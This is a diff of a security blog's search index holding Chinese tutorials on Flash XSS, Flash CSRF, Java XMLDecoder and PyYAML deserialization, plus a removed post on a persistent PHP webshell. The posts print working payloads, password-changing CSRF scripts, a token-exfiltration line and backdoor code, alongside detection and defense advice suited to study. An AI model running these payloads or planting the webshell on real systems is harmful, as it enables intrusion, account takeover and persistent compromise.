@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[ZeroClipboard.swf的Flash型XSS分析]]></title>
+    <url>%2F2019%2F07%2F30%2FZeroClipboard-swf%E7%9A%84Flash%E5%9E%8BXSS%E5%88%86%E6%9E%90%2F</url>
+    <content type="text"><![CDATA[0x01 ZeroClipboard简介ZeroClipboard是一款基于Flash的，兼容性较强的用于剪贴板复制的JS插件，它是基于Flash来实现跨浏览器的复制功能的。 0x02 Flash XSS分析当ZeroClipboard的版本&lt;=1.0.7时，会存在Flash XSS漏洞。 漏洞版本下载地址：https://github.com/JoyChou93/FlashXss/tree/master/ZeroClipboard 我们下载了ZeroClipboard.swf文件后，使用FFDec软件来对其进行反编译，得到as代码： 得到如下as源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package&#123; import flash.display.LoaderInfo; import flash.display.Sprite; import flash.display.StageScaleMode; import flash.events.Event; import flash.events.MouseEvent; import flash.external.ExternalInterface; import flash.system.Security; import flash.system.System; public class ZeroClipboard extends Sprite &#123; private var button:Sprite; private var id:String = &quot;&quot;; private var clipText:String = &quot;&quot;; public function ZeroClipboard() &#123; super(); stage.scaleMode = StageScaleMode.EXACT_FIT; Security.allowDomain(&quot;*&quot;); var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters; id = flashvars.id; button = new Sprite(); button.buttonMode = true; button.useHandCursor = true; button.graphics.beginFill(13434624); button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height)); button.alpha = 0; addChild(button); button.addEventListener(MouseEvent.CLICK,clickHandler); button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null); &#125;); button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null); &#125;); button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null); &#125;); button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null); &#125;); ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor); ExternalInterface.addCallback(&quot;setText&quot;,setText); ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null); &#125; public function setHandCursor(param1:Boolean) : * &#123; button.useHandCursor = param1; &#125; private function clickHandler(param1:Event) : void &#123; System.setClipboard(clipText); ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;complete&quot;,clipText); &#125; public function setText(param1:*) : * &#123; clipText = param1; &#125; &#125;&#125; 关注重点放在ZeroClipboard()函数上。 接着，我们搜索是否存在有接受外部输入参数的关键字，这里我们找到了AS3的传参语句： 1var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters; 跟踪下去，看看获取到传入的参数值的flashvars变量的调用链： 123id = flashvars.id;button = new Sprite();... button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height)); 可以看到，分别有id、width和height三个参数可以控制。传入参数id赋给了id变量，而其它两个参数则传入创建button按钮的宽和高，若不传的话会创建失败、无法执行到后续的代码逻辑中去。 这里继续跟踪id变量，可以看到都是作为ExternalInterface.call()函数的第二个参数传入的，当button成功创建并添加了一些监听事件后，在鼠标移动时就会触发且最后还会调用触发一次，此时就导致了Flash XSS漏洞的存在： 12345678910111213141516171819button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null);&#125;);button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null);&#125;);button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null);&#125;);button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null);&#125;);ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor);ExternalInterface.addCallback(&quot;setText&quot;,setText);ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null); 好了，最后理下，就是通过loaderInfo.parameters，我们可以传入三个参数id、width和height；其中width和height是必须传入的，否则进不了后续的代码逻辑；id参数则直接传入到ExternalInterface.call()函数的第二个参数执行，导致了Flash XSS漏洞的存在。 结合ExternalInterface.call()函数的第二个参数可控的payload，直接构造输入如下payload即可成功触发Flash XSS： 1?id=\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&amp;width=100&amp;height=100 这里只要你移动鼠标就会触发： 用IE的开发者工具调试可以看到实际执行JS代码如下，注入的内容成功闭合了后面的语句，造成XSS： 1try &#123; __flash__toXML(ZeroClipboard.dispatch(&quot;\\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&quot;,&quot;mouseOut&quot;,null)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125; 这里多说一句，如果payload写成如下是不成功的： 1?id=\&quot;));alert(&apos;mi1k7ea&apos;);&#125;catch(e)&#123;&#125;//&amp;width=100&amp;height=100 这是因为ZeroClipboard未定义，在之前alert前就会报错直接跳转到了catch代码段中执行，绕过了我们注入的XSS payload： 0x03 参考Flash XSS Securit]]></content>
+      <categories>
+        <category>Web安全基础</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>XSS</tag>
+        <tag>Flash</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Flash型CSRF总结]]></title>
     <url>%2F2019%2F07%2F28%2FFlash%E5%9E%8BCSRF%E6%80%BB%E7%BB%93%2F</url>
     <content type="text"><![CDATA[0x01 基本原理Flash功能丰富，我们可以使用其API来向任意站点发送请求，而且发送的请求会继承当前浏览器的会话。换句话说，我们可以利用Flash而非JavaScript来控制浏览器向目标URL发送请求，从而实现Flash CSRF攻击。 我们知道，通过Flash请求外部资源时，会先访问外域是否存在crossdomain.xml且判断Flash当前域是否在allow-access-from标签配置的domain内。当domain的值为通配符*时，表明该站资源对所有外域开放，等同于舍弃了Flash层面的同源策略的限制。 Flash CSRF在于：如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。 0x02 攻击场景使用Flash来发起CSRF攻击，一般用于绕过一些特定情形，下面就列两个常见的。 场景1——绕过Referer等HTTP头字段检测很多时候，Web站点后台会对Referer字段进行校验，但是有时候会出现未校验无Referer字段等情况的缺陷。 用Flash发起的CSRF，可以去掉HTTP头中的Referer字段，从而可以绕过校验Referer字段（但未校验空Referer）来防御CSRF攻击的机制。除此之外，还能去掉Origin字段。 攻击原理和CSRF一样的，只不过从经典的伪造表单变成了触发swf文件的形式： 攻击者编写恶意的Flash文件，用于从目标敏感页面中获取受害者的敏感信息或者获取页面的token值； 攻击者将该Flash文件上传至自己的服务器中，并诱使受害者访问加载该恶意Flash文件的页面； 受害者访问目标敏感页面后，在同一浏览器中被诱使访问攻击者服务器加载了恶意Flash文件的页面，此时的访问是会带上受害者在目标页面的会话的； 由于无Referer字段，Bypass了目标站点后台的CSRF防御机制，成功获取到页面token或用户敏感信息，实现了CSRF攻击； 下面举两个不同方式的Demo。 GET方式首先攻击者发现目标站点的crossdomain.xml存在Flash型CSRF风险： 1234&lt;?xml version="1.0"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain="*"/&gt;&lt;/cross-domain-policy&gt; 然后攻击者编写恶意Flash，用于在目标页面进行危险敏感的GET操作： 12345678910function CSRF():void&#123; var urlLoader:URLLoader=new URLLoader(); var request:URLRequest=new URLRequest(); request.url=&quot;http://a.com/m7.php&quot;; request.method=URLRequestMethod.GET; request.data=&quot;user=admin&amp;msg=GET_secret_content&quot;; urlLoader.load(request); &#125;CSRF(); 编译为swf文件后放置到攻击者的Web目录，然后诱使受害者访问，即可向目标站点通过GET方式带上受害者当前访问该页面的浏览器会话来发送敏感操作的请求： POST方式123456789import flash.net.URLRequest;import flash.system.Security;var url = new URLRequest(&quot;http://a.com/m7.php&quot;);var shellcode = new URLVariables();shellcode = &quot;user=admin&amp;msg=POST_hacker_content&quot;;url.method = &quot;POST&quot;;url.data = shellcode;sendToURL(url);stop(); 诱使受害者访问攻击者的页面后，触发Flash向目标页面发起POST请求，进行危险的操作： 可以明显看到，请求报文并没有Referer字段。 场景2——上传Flash到目标站点绕过crossdomain有个知识点——Flash并不关心扩展名或者Content-Type。如果使用object标签嵌入文件，只要文件内容为有效的Flash文件，它就会被当作是Flash文件来执行。 简单说下利用过程： 攻击者发现目标站点的crossdomain.xml中domain设置并不为*，而是几个其他域名； 攻击者搜索几个白名单域名中的子域名，寻找可上传文件的域名，如victim.com中允许上传图片文件，但校验了文件后缀名和Content-Type； 攻击者创建恶意Flash文件，并修改后缀名为jpg，然后通过篡改Content-Type将其上传到victim.com中； 获取到上传文件的地址后，攻击者使用类型为application/x-shockwave-flash的object标签将文件嵌入到攻击者服务器中，如attacker.com； 受害者访问了victim.com，然后在同一浏览器中被诱使访问attacker.com，触发了攻击者上传的恶意Flash，从而可使攻击者窃取CSRF的token或目标站点页面的敏感信息，实现CSRF攻击； 类似的payload如下： 1&lt;object style = "height ：1px ; width ：1px ; " data = "http://victim.com/user/2292/profilepicture.jpg" type = "application / x-shockwave-flash" allowscriptaccess = "always" flashvars = "c = read＆u = http://victim.com/secret_file.txt" &gt; &lt;/object&gt; 实际攻击利用案例可直接看如下链接，该作者发现了Paypal的Flash CSRF漏洞并在YouTube上进行了漏洞利用的演示： https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html 0x03 攻击案例下面以DVWA的Low级和High级的场景为例进行Flash CSRF的攻击利用。 GET型无Anti-CSRF token我们知道，Low级的场景非常简单，表单参数通过GET方式传入，无CSRF-token防御机制，也无校验当前密码： 首先，我们查看到目标站点是存在crossdomain.xml文件的，且domain设置为*，明显存在Flash CSRF风险： 接着，我们根据前面看到的表单将前面场景1中的GET方式的代码稍微改下即可： 12345678910function CSRF():void&#123; var urlLoader:URLLoader=new URLLoader(); var request:URLRequest=new URLRequest(); request.url=&quot;http://a.com/dvwa/vulnerabilities/csrf/index.php&quot;; request.method=URLRequestMethod.GET; request.data=&quot;password_new=hacker&amp;password_conf=hacker&amp;Change=Change&quot;; urlLoader.load(request); &#125;CSRF(); 编译成swf文件后，放置到我们自己的服务器中，然后诱使受害者访问我们的恶意swf文件；如果受害者在此之前在同一浏览器中登录了目标站点，那么就会成功触发Flash CSRF攻击，从而密码被篡改： 这里看到，受害者被诱导访问我们服务器上的恶意swf文件后，Flash先向目标服务器访问请求是否存在crossdomain.xml且是否允许当前域访问，当OK后就发送GET方式的恶意表单请求篡改密码。这里注意到右侧的HTTP头字段，由Flash发起的请求会带上用户的会话，Referer为Flash文件所在的地址，同时会添加一个x-flash-version字段用于标志Flash版本信息。 我们发送恶意链接诱使受害者点击访问，自己大概估算个受害者点击访问的时间后，使用admin/hacker用户名密码即可登录成功。 GET型含Anti-CSRF token在前面的基础上，High级添加了Anti-CSRF token机制，即在修改密码的表单处添加了一项隐藏的token，当用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求： 这时就比Low级多了一步，需要先获取当前表单页面的Anti-CSRF token值，再一起发送篡改密码的请求。 这里我们编写恶意swf文件，主要添加了先让受害者请求表单页面，将返回的响应内容通过正则表达式来匹配出此时Anti-CSRF token的值，然后添加上token参数一同发送GET方式表单请求篡改密码： 12345678910111213141516171819202122232425//获取当前页面user_tokenvar targetURL:String = &quot;http://192.168.43.201/dvwa/vulnerabilities/csrf/index.php&quot;;var request:URLRequest = new URLRequest(targetURL);request.method = URLRequestMethod.GET;request.data = &quot;&quot;;sendToURL(request);var loader:URLLoader=new URLLoader();loader.addEventListener(Event.COMPLETE,completeHandler);function completeHandler(event:Event):void&#123;var user_token:String = loader.data.match(&quot;user_token&apos; value=&apos;(.*?)&apos;&quot;)[1];//将token发回//var targetURL2:String = &quot;http://a.com/gettoken.php&quot;;//var request2:URLRequest = new URLRequest(targetURL2);//request2.method = URLRequestMethod.POST;//request2.data = &quot;user_token=&quot; + user_token;//sendToURL(request2);//发起CSRF攻击，篡改密码var request3:URLRequest = new URLRequest(targetURL);request3.method = URLRequestMethod.GET;request3.data = &quot;password_new=hacker&amp;password_conf=hacker&amp;Change=Change&amp;user_token=&quot; + user_token;sendToURL(request3);&#125;loader.load(request); 和Low级一样的原理，不再累赘，看看效果。 当受害者访问的是low.swf文件时，该文件时不带token的，会修改失败，302重定向回之前的页面： 当受害者访问的是high.swf文件时，带上了token参数，成功进行了密码的篡改： 0x04 检测方法检查网站的crossdomain.xml文件，如果allow-access-from标签中domain值设置为*则可能存在Flash CSRF漏洞；如果设置domain值为多个外域，需要人工分析是否存在风险。 0x05 防御方法 当站点不需要跨域请求资源时，尽量删除crossdomain.xml文件； 若需crossdomain.xml文件，则必须严格设置allow-access-from标签中domain的白名单； 0x06 参考The lesser known pitfalls of allowing file uploads on your website crossdomain.xml : Beware of Wildcards Flash CSRF – _Dy]]></content>
@@ -9,8 +22,8 @@
       </categories>
       <tags>
         <tag>Web安全</tag>
-        <tag>CSRF</tag>
         <tag>Flash</tag>
+        <tag>CSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -240,8 +253,8 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>Python</tag>
+        <tag>Web安全</tag>
         <tag>SSTI</tag>
       </tags>
   </entry>
@@ -253,8 +266,8 @@
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>Python</tag>
+        <tag>Web安全</tag>
         <tag>沙箱逃逸</tag>
       </tags>
   </entry>
@@ -788,28 +801,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Java XMLDecoder反序列化漏洞]]></title>
-    <url>%2F2019%2F01%2F01%2FXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
-    <content type="text"><![CDATA[基本概念XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下。 影响版本XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。 Demo1234567891011121314151617181920212223242526272829303132333435363738394041import com.sun.beans.decoder.DocumentHandler;import org.xml.sax.helpers.DefaultHandler;import javax.xml.parsers.SAXParser;import javax.xml.parsers.SAXParserFactory;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.beans.XMLDecoder;public class test &#123; public static void XMLDecode_Deserialize(String path) throws Exception &#123; File file = new File(path); FileInputStream fis = new FileInputStream(file); BufferedInputStream bis = new BufferedInputStream(fis); XMLDecoder xd = new XMLDecoder(bis); xd.readObject(); xd.close(); &#125; public static void main(String[] args)&#123; //XMLDecode Deserialize Test String path = "poc.xml"; try &#123; XMLDecode_Deserialize(path);// File f = new File(path);// SAXParserFactory sf = SAXParserFactory.newInstance();// SAXParser sp = sf.newSAXParser();//// DefaultHandler dh = new DefaultHandler();// DocumentHandler dh = new DocumentHandler();// sp.parse(f, dh); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Payload： poc.xml，可以看到java标签的class属性指定XMLDecoder类，对象标签指定ProcessBuilder类、void标签指定方法为start，即可调用ProcessBuilder.start()来执行其中的命令。 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="1"&gt; &lt;void index="0"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start" /&gt; &lt;/object&gt;&lt;/java&gt; 运行后，会弹出计算器： 调试分析在IDEA下设置断点跟踪调试。 在readObject()处设置断点，可看到XMLDecoder对象xd的input属性包含了输入XML文档的路径： 继续往里调试，调用到XMLDecoder.parsingComplete()时，发现里面调用了 XMLDecoder.this.handler.parse()，其中this.handler即为DocumentHandler，换句话说，就是调用了DocumentHandler.parser()来解析输入的XML文档内容： 跟踪进去，可以看到DocumentHandler.parser()中调用了如下函数来解析XML内容： 1SAXParserFactory.newInstance().newSAXParser().parse() 接着设置xmlReader的相关handler，如处理XML内容、实体、错误、文档类型定义、文件等句柄，最后调用xmlReader.parse()解析XML文件内容： 继续调试，在XML11Configuration.parse()中发现调用determineDocVersion()： 跟踪进去发现，determineDocVersion()主要获取XML实体扫描器然后扫描解析\&lt;?xml version=…?&gt;来获取XML文档的版本信息： 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为“[xml]”、DTD的伪名称为“[dtd]”、参数实体名称以“%”开头；接着函数内部会调用startDocument()函数开始准备文件扫描）： 可以看到最后调用到的startDocument()函数会清空当前对象和句柄为文件扫描的开始做准备： 返回到XML11Configuration.parse()中继续往下调试，调用scanDocument()开始文件扫描： 进入scanDocument()，可以看到设置实体句柄后，主要是执行do while循环体，其中的包含START_DOCUMENT、START_ELEMENT、CHARACTERS、SPACE、ENTITY_REFERENCE、PROCESSING_INSTRUCTION、COMMENT、DTD、CDATA、NOTATION_DECLARATION、ENTITY_DECLARATION、NAMESPACE、ATTRIBUTE、END_ELEMENT等的扫描识别： 中间XML节点解析的过程不用过多分析，调试至END_ELEMENT时，可以看到其中提取出“calc”参数值： 跟踪进去后面的getValueObject()函数，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，在调用Expression()： 继续跟踪到里面，最后会调用MethodUtil.invoke()方法实现反射执行任意类方法： 再次F7直接执行了代码弹出计算器： 整体地看一下，整个调用过程大致如下： 1XMLDecoder.readObject() -&gt; XMLDecoder.parsingCompelete() -&gt; DocumentHandler.parse() -&gt; SAXParserFactory.newInstance().newSAXParser().parse() -&gt; xmlReader.parse() 可以发现，XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的。 那么可以去分析一下，到底哪个类才是真正的漏洞类。测试一下，可以看出DocumentHandler类才是XMLDecoder反序列化漏洞的根源类： 检测方法全局搜索XMLDecoder关键字，排查是否调用readObject()函数且参数是否可控。 防御方法若可以尽量不使用XMLDecoder反序列化XML内容；若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。]]></content>
+    <title><![CDATA[Python PyYAML反序列化漏洞]]></title>
+    <url>%2F2019%2F01%2F01%2FPyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[基本概念（引用百度）YAML是“YAML不是一种标记语言”的外语缩写；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 PyYAML是Python中YAML语言的编辑器和解释器。 安装：pip install PyYAML 两个函数： yaml.dump()：将一个Python对象序列化生成为yaml文档。 yaml.load()：将一个yaml文档反序列化为一个Python对象。 简单的用例： 可以看到，User对象经过yaml序列化之后内容为一行字符串，简单解释一下：“!!pythonobject”为yaml标签，yaml.load()会识别该标签并调用相应的方法执行反序列化操作；冒号后面的“__main__”为py文件名，这里为本文件的意思；“User”为序列化的对象类型，后面紧跟的大括号即为该对象的属性及其属性值。 更详细的说明可参考官方文档。 Demo这里编写简单的Demo，一个py文件用于将恶意类序列化为字符串保存到yaml文件中，另一个py文件用于反序列化yaml文件内容为恶意类对象从而达到利用反序列化漏洞的目的。 yaml_test.py先创建一个poc对象再调用yaml.dump()将其序列化为一个字符串，其中第10行代码为将默认的“__main__”替换为该文件名“yaml_test”，目的是为了后面yaml.load()反序列化该字符串的时候会根据yaml文件中的指引去读取yaml_ test.py中的poc这个类，否则无法正确执行： yaml_test2.py直接yaml.load()读取目标yaml文件，由!!python/object标签解析其中的名为yaml_test的module中的poc类，最后执行了该类对象的__init__()方法从而执行了命令： 漏洞根源分析到$PYTHON_HOME/lib/site-packages/yaml/constructor.py中查看3个特殊Python标签的源码。 !!python/object标签： !!python/object/new标签： !!python/object/apply标签： 可以看到，!!python/object/new标签的代码实现其实就是!!python/object/apply标签的代码实现，只是最后newobj参数值不同而已。这3个Python标签中都是调用了make_python_instance()函数，查看该函数： 可以看到，在该函数是会根据参数来动态创建新的Python类对象或通过引用module的类创建对象，从而可以执行任意命令。 通用payload只要存在yaml.load()且参数可控，则可以利用yaml反序列化漏洞，payload列举如下，当然不止如下： 附上测试代码： 1234567891011import yamlpayload = '!!python/object/apply:subprocess.check_output [[calc.exe]]'#payload = '!!python/object/apply:subprocess.check_output ["calc.exe"]'#payload = '!!python/object/apply:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/apply:os.system ["calc.exe"]'#payload = '!!python/object/new:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/new:os.system ["calc.exe"]'yaml.load(payload) 一个疑问点？为什么“!!python/object”标签不好使，明明Demo用的是这个标签，但通用payload中无法执行该payload？看了一些网上的文章也没有分析原因，其实查看官方文档就知道怎么回事了： 可以看到，!!python/object标签的使用格式和另外两个根本就是两码事，其接收参数是使用大括号{}而非中括号[]，且并没有对参数args进行接收。也就是说，!!python/object标签只针对于对象类进行使用。 检测方法全局搜索Python代码中是否包含“import yaml”，若包含则进一步排查是否调用yaml.load()且参数是可控的。 防御方法使用安全函数yaml.safe_load()替代yaml.load()即可。]]></content>
       <categories>
-        <category>Java</category>
+        <category>Python</category>
       </categories>
       <tags>
+        <tag>Python</tag>
         <tag>Web安全</tag>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[PHP内存型木马]]></title>
-    <url>%2F2019%2F01%2F01%2FPHP%E5%86%85%E5%AD%98%E5%9E%8B%E6%9C%A8%E9%A9%AC%2F</url>
-    <content type="text"><![CDATA[基本概念PHP内存性木马即PHP不死马，一般会删除自身以进程的形式循环创建隐蔽的后门。 通常在AWD Web题中用得较多。 Demo及原理nodie.php 123456789101112&lt;?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '/var/www/dvwa/.ski12.php'; $code = '&lt;?php if(md5($_POST["pass"])=="cdd7b7420654eb16c1e1b748d5b7c5b8")&#123;@system($_POST[a]);&#125;?&gt;'; while (1) &#123; file_put_contents($file, $code); system('touch -m -d "2018-12-01 09:10:12" .ski12.php'); usleep(5000); &#125;?&gt; 简单分析： ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。 set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。 unlink(__FILE__)删除文件本身，以起到隐蔽自身的作用。 while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过“find –name \’*.php\’ –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。 至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。 这里以DVWA为示例： 先找到上传点上传nodie.php： 访问文件所在路径让其执行，等待一会发现404，该文件不存在： 一般而言分两种情况，一种是乐观的、即文件执行成功且删除了自身、生成了隐蔽的后门；另一种是被干掉了。直接访问我们设置生成的隐蔽后门的路径检测一下是否真的生成了后门文件： 虽然没有返回，但确实存在该文件，接着直接利用即可： 以运维的视角尝试删除文件，发现删不掉： 查杀方法1、如果允许，重启服务是万能的； 2、其次，最好的解决方案是kill掉www-data用户的所有子进程： ps aux | grep www-data | awk ‘{print $2}’ | xargs kill -9 3、创建一个和不死马生成的马一样名字的目录； 4、编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。简单示例： 12345678&lt;?phpwhile (1) &#123; $pid = 不死马的进程PID; @unlink(".ski12.php"); exec("kill -9 $pid"); usleep(1000);&#125;?&gt;]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>AWD</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -822,6 +822,18 @@
       <tags>
         <tag>Web安全</tag>
         <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Java XMLDecoder反序列化漏洞]]></title>
+    <url>%2F2019%2F01%2F01%2FXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[基本概念XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下。 影响版本XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。 Demo1234567891011121314151617181920212223242526272829303132333435363738394041import com.sun.beans.decoder.DocumentHandler;import org.xml.sax.helpers.DefaultHandler;import javax.xml.parsers.SAXParser;import javax.xml.parsers.SAXParserFactory;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.beans.XMLDecoder;public class test &#123; public static void XMLDecode_Deserialize(String path) throws Exception &#123; File file = new File(path); FileInputStream fis = new FileInputStream(file); BufferedInputStream bis = new BufferedInputStream(fis); XMLDecoder xd = new XMLDecoder(bis); xd.readObject(); xd.close(); &#125; public static void main(String[] args)&#123; //XMLDecode Deserialize Test String path = "poc.xml"; try &#123; XMLDecode_Deserialize(path);// File f = new File(path);// SAXParserFactory sf = SAXParserFactory.newInstance();// SAXParser sp = sf.newSAXParser();//// DefaultHandler dh = new DefaultHandler();// DocumentHandler dh = new DocumentHandler();// sp.parse(f, dh); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Payload： poc.xml，可以看到java标签的class属性指定XMLDecoder类，对象标签指定ProcessBuilder类、void标签指定方法为start，即可调用ProcessBuilder.start()来执行其中的命令。 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="1"&gt; &lt;void index="0"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start" /&gt; &lt;/object&gt;&lt;/java&gt; 运行后，会弹出计算器： 调试分析在IDEA下设置断点跟踪调试。 在readObject()处设置断点，可看到XMLDecoder对象xd的input属性包含了输入XML文档的路径： 继续往里调试，调用到XMLDecoder.parsingComplete()时，发现里面调用了 XMLDecoder.this.handler.parse()，其中this.handler即为DocumentHandler，换句话说，就是调用了DocumentHandler.parser()来解析输入的XML文档内容： 跟踪进去，可以看到DocumentHandler.parser()中调用了如下函数来解析XML内容： 1SAXParserFactory.newInstance().newSAXParser().parse() 接着设置xmlReader的相关handler，如处理XML内容、实体、错误、文档类型定义、文件等句柄，最后调用xmlReader.parse()解析XML文件内容： 继续调试，在XML11Configuration.parse()中发现调用determineDocVersion()： 跟踪进去发现，determineDocVersion()主要获取XML实体扫描器然后扫描解析\&lt;?xml version=…?&gt;来获取XML文档的版本信息： 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为“[xml]”、DTD的伪名称为“[dtd]”、参数实体名称以“%”开头；接着函数内部会调用startDocument()函数开始准备文件扫描）： 可以看到最后调用到的startDocument()函数会清空当前对象和句柄为文件扫描的开始做准备： 返回到XML11Configuration.parse()中继续往下调试，调用scanDocument()开始文件扫描： 进入scanDocument()，可以看到设置实体句柄后，主要是执行do while循环体，其中的包含START_DOCUMENT、START_ELEMENT、CHARACTERS、SPACE、ENTITY_REFERENCE、PROCESSING_INSTRUCTION、COMMENT、DTD、CDATA、NOTATION_DECLARATION、ENTITY_DECLARATION、NAMESPACE、ATTRIBUTE、END_ELEMENT等的扫描识别： 中间XML节点解析的过程不用过多分析，调试至END_ELEMENT时，可以看到其中提取出“calc”参数值： 跟踪进去后面的getValueObject()函数，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，在调用Expression()： 继续跟踪到里面，最后会调用MethodUtil.invoke()方法实现反射执行任意类方法： 再次F7直接执行了代码弹出计算器： 整体地看一下，整个调用过程大致如下： 1XMLDecoder.readObject() -&gt; XMLDecoder.parsingCompelete() -&gt; DocumentHandler.parse() -&gt; SAXParserFactory.newInstance().newSAXParser().parse() -&gt; xmlReader.parse() 可以发现，XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的。 